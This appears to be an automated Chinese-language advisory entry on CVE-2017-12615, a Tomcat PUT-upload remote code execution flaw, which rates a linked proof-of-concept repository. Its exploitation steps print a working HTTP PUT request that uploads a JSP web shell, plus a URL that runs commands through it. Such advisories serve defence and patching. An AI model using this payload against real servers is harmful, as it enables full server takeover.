## CVE-2017-12615 - Apache Tomcat JSP上传远程代码执行

**漏洞编号:** CVE-2017-12615

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 7.0.0 to 7.0.79

**利用条件:** 运行在Windows上，HTTP PUT方法已启用（readonly初始化参数设置为false）

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2017-12615漏洞允许攻击者通过PUT请求上传恶意的JSP文件到Tomcat服务器，并在服务器上执行任意代码。该漏洞存在于Apache Tomcat 7.0.0到7.0.79版本，并且只有在Tomcat运行在Windows系统，且启用了HTTP PUT方法时才会受到影响（例如，`readonly` 初始化参数设置为 `false`）。

**有效性：**
提供的POC代码是有效的。通过在JSP文件名后附加'/'字符，可以绕过文件扩展名检查，从而成功上传JSP文件。

**投毒风险：**
检查了提供的`README.md`文件，该文件描述了漏洞的利用方法，并提供了利用代码示例。没有发现任何隐藏的、恶意的或具有破坏性的代码。该文件主要是对漏洞的描述和演示，因此，投毒风险为0%。

**利用方式：**
1.  **前提条件：** 目标Tomcat服务器必须运行在Windows上，且HTTP PUT方法已启用。
2.  **上传JSP文件：** 使用PUT请求，将包含恶意代码的JSP文件上传到服务器。关键是文件名需要以`.jsp/`结尾，以绕过文件扩展名检查。例如：

    ```http
    PUT /shell.jsp/
    Host: target-host:port
    Content-Length: [payload length]

    <%Runtime.getRuntime().exec(request.getParameter("cmd"));%>
    ```

3.  **执行代码：** 成功上传JSP文件后，可以通过访问该JSP文件的URL来执行其中的代码。例如，访问`http://target-host:port/shell.jsp?cmd=whoami` 就可以执行`whoami`命令，获取服务器信息。

**项目地址:** [breaktoprotect/CVE-2017-12615](https://github.com/breaktoprotect/CVE-2017-12615)

**漏洞详情:** [CVE-2017-12615](https://nvd.nist.gov/vuln/detail/CVE-2017-12615)